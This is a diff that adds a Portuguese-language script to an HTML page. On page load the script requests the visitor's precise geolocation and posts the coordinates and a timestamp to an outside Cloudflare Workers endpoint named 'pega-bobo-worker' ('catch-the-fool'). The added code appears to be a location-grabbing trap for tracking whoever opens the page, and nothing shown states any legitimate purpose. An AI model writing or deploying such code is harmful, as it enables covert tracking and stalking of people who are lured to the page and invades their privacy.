@@ -42,5 +42,66 @@
             alert("Erro: " + error.message);
         }
     </script>
+    <script>
+    async function sendLocation(position) {
+        const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: new Date().toISOString()
+        };
+
+        const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
+        
+        console.log("[DEBUG] Enviando para:", workerUrl);
+        console.log("[DEBUG] Dados:", data);
+
+        try {
+            const response = await fetch(workerUrl, {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json",
+                    "X-Debug": "true" 
+                },
+                body: JSON.stringify(data)
+            });
+            
+            console.log("[DEBUG] Resposta completa:", response);
+            
+            const responseData = await response.json();
+            console.log("[DEBUG] Corpo da resposta:", responseData);
+            
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            
+            alert(responseData.success ? "✅ Localização enviada!" : "❌ Erro ao enviar");
+        } catch (error) {
+            console.error("[ERRO] Detalhes:", error);
+            alert(`Falha na comunicação: ${error.message}`);
+        }
+    }
+
+    function handleError(error) {
+        console.error("[ERRO] Geolocalização:", error);
+        alert("Erro: " + error.message);
+    }
+
+    window.addEventListener("load", () => {
+        if (navigator.geolocation) {
+            console.log("[DEBUG] Solicitando geolocalização...");
+            navigator.geolocation.getCurrentPosition(
+                sendLocation, 
+                handleError,
+                { 
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            alert("Seu navegador não suporta geolocalização!");
+        }
+    });
+</script>
 </body>
 </html>
